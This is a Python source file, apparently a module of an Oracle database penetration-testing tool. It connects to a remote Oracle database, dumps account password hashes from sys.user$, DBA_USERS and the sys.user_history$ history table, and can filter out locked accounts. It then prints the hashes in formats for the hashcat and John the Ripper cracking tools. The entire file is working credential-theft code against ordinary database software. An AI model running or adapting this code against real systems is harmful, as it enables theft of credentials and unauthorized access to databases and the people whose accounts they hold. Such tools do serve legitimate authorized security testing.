#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging
from Constants import *
from Info import Info
from Utils import checkOptionsGivenByTheUser

class Passwords (OracleDatabase):
	'''
	Password guesser
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("Passwords object created")
		OracleDatabase.__init__(self,args)
		self.passwords = []

	def __resetPasswordList__(self):
		'''
		reset self.passwords
		'''
		self.passwords = []
		
	def __getLockedUsernames__(self):
		'''
		Returns a list which contains Oracle usernames (i.e accounts) who are locked
		Return Empty list if an error
		'''
		logging.info("Getting Oracle locked accounts...")
		lockedAccountList = []
		req =  "SELECT username, account_status FROM dba_users WHERE account_status != 'OPEN'"
		results = self.__execQuery__(query=req, ld=['username', 'account_status'])
		if isinstance(results,Exception):
			logging.info("Impossible to get locked Oracle accounts: {0}. Continue with empty list of account locked".format(results))
			return []
		else:
			logging.info("List of Oracle accounts locked gotten: {0}".format(results))
			for anAccount in results: lockedAccountList.append(anAccount['username'])
			return lockedAccountList

	def __tryToGetHashedPasswords__(self, blacklistOfUsernames=[]):
		'''
		Try to get hashed password
		If username is in the blacklist (blacklistOfUsernames), the account is not returned in results
		In Oracle 11g-12g: select name, password, spare4 from sys.user$
		In Oracle 9-10: SELECT username, password FROM DBA_USERS;
		'''
		currentUsername = ""
		isVersion11or12 = False
		self.__resetPasswordList__()
		if self.isDBVersion('11.') or self.isDBVersion('12.') or self.isDBVersion('18.'):
			req = "SELECT name, password, spare4 FROM sys.user$"
			results = self.__execQuery__(query=req,ld=['name', 'password','spare4'])
			isVersion11or12 = True
		else :
			req =  "SELECT username, password FROM DBA_USERS"
			results = self.__execQuery__(query=req,ld=['username', 'password'])	
			isVersion11or12 = False
		if isinstance(results,Exception):
			logging.info("Impossible to get hashed passwords: {0}".format(results))
			return results
		else :
			logging.info("Get hashed passwords")
			for anAccount in results:
				if isVersion11or12 == True: currentUsername = anAccount['name']
				else: currentUsername = anAccount['username']
				if currentUsername in blacklistOfUsernames:
					logging.debug("The account {0} will be not in hashed password list because this account is locked".format(currentUsername))
				else :
					self.passwords.append(anAccount)
		return True

	def __tryToGetHashedPasswordsfromHistory__(self):
		'''
		Try to get hashed password from select * from sys.user_history$;
		PASSWORD_REUSE_TIME or/and PASSWORD_REUSE_MAX must be used to have passwords in this table
		'''
		self.__resetPasswordList__()
		req = "SELECT user#, password, password_date FROM sys.user_history$"
		results = self.__execQuery__(query=req,ld=['user#', 'password','password_date'])
		if isinstance(results,Exception):
			logging.info("Impossible to get hashed passwords from the sys.user_history$ table: {0}".format(results))
			return results
		else :
			logging.info("Get hashed passwords from the sys.user_history$ table")
			for l in results:
				self.passwords = results
		return True

	def printPasswords (self):
		'''
		print passwords
		'''	
		for l in self.passwords:
			if len(l)==3 and l.has_key('name') and l.has_key('spare4') and l.has_key('password'):
				if (l['password']!=None or l['spare4']!=None): print "{0}; {1}; {2}".format(l['name'], l['password'],l['spare4'])
			elif l.has_key('username') and l.has_key('password'):
				if l['password']!=None : print "{0}:{1}".format(l['username'], l['password'])
			elif l.has_key('user#') and l.has_key('password') and l.has_key('password_date'):
				if l['password']!=None : print "{0}; {1}; {2}".format(l['user#'], l['password'], l['password_date'])
		
	def printPasswordsOclHashcat (self):
		'''
		print 10g Oracle hashed for hashcat
		'''	
		for l in self.passwords:
			if l.has_key('name') and l.has_key('password'):
				if l['password']!=None and ' ' not in l['password']: print "{1}:{0}".format(l['name'], l['password'])
			elif l.has_key('username') and l.has_key('password'):
				if l['password']!=None : print "{1}:{0}".format(l['username'], l['password'])
			elif l.has_key('user#') and l.has_key('password') and l.has_key('password_date'):
				if l['password']!=None : print "{0}; {1}; {2}".format(l['user#'], l['password'], l['password_date'])

	def printPasswordsJohn (self):
		'''
		print 10g Oracle hashed for john the ripper
		'''	
		for l in self.passwords:
			if l.has_key('name') and l.has_key('password'):
				if l['password']!=None and ' ' not in l['password']: print "{0}:{1}".format(l['name'], l['password'])
			elif l.has_key('username') and l.has_key('password'):
				if l['password']!=None : print "{0}:{1}".format(l['username'], l['password'])
			elif l.has_key('user#') and l.has_key('password') and l.has_key('password_date'):
				if l['password']!=None : print "{0}; {1}; {2}".format(l['user#'], l['password'], l['password_date'])
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Hashed Oracle passwords ?")
		logging.info("Try to get Oracle hashed passwords")
		status = self.__tryToGetHashedPasswords__()
		if status == True :
			self.args['print'].goodNews("OK")
		else : 
			self.args['print'].badNews("KO")
		self.args['print'].subtitle("Hashed Oracle passwords from history?")
		logging.info("Try to get Oracle hashed passwords from the history table")
		status = self.__tryToGetHashedPasswordsfromHistory__()
		if status == True :
			self.args['print'].goodNews("OK")
		else : 
			self.args['print'].badNews("KO")

def runPasswordsModule(args):
	'''
	Run the Passwords module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-from-history", "get-passwords-not-locked"]) == False : return EXIT_MISS_ARGUMENT
	passwords = Passwords(args)
	status = passwords.connection(stopIfError=True)
	passwords.__getLockedUsernames__()
	if args.has_key('info')==False:
		info = Info(args)
		info.loadInformationRemoteDatabase()
		args['info'] = info
	if args['test-module'] == True :
		args['print'].title("Test if hashed passwords can be got")
		status = passwords.testAll()
	if args['get-passwords'] == True :
		args['print'].title("Try to get Oracle hashed passwords")
		status = passwords.__tryToGetHashedPasswords__()
		if status == True :
			args['print'].goodNews("Here are Oracle hashed passwords (some accounts can be locked):")
			passwords.printPasswords()
			args['print'].goodNews("Here are 10g Oracle hashed passwords for oclHashcat (some accounts can be locked):")
			passwords.printPasswordsOclHashcat()
			args['print'].goodNews("Here are 10g Oracle hashed passwords for John the Ripper (some accounts can be locked):")
			passwords.printPasswordsJohn()
		else : 
			args['print'].badNews("Impossible to get hashed passwords: {0}".format(status))
	if args['get-passwords-not-locked'] == True :
		args['print'].title("Try to get Oracle hashed passwords when the account is not locked")
		blacklistOfUsernames = passwords.__getLockedUsernames__()
		status = passwords.__tryToGetHashedPasswords__(blacklistOfUsernames)
		if status == True :
			args['print'].goodNews("Here are Oracle hashed passwords (all accounts are opened, not locked):")
			passwords.printPasswords()
			args['print'].goodNews("Here are 10g Oracle hashed passwords for oclHashcat (all accounts are opened, not locked):")
			passwords.printPasswordsOclHashcat()
			args['print'].goodNews("Here are 10g Oracle hashed passwords for John the Ripper (all accounts are opened, not locked):")
			passwords.printPasswordsJohn()
		else : 
			args['print'].badNews("Impossible to get hashed passwords: {0}".format(status))
	if args['get-passwords-from-history'] == True :
		args['print'].title("Try to get Oracle hashed passwords from history")
		status = passwords.__tryToGetHashedPasswordsfromHistory__()
		if status == True :
			args['print'].goodNews("Here are Oracle hashed passwords:")
			passwords.printPasswords()
		else : 
			args['print'].badNews("Impossible to get hashed passwords from history: {0}".format(status))



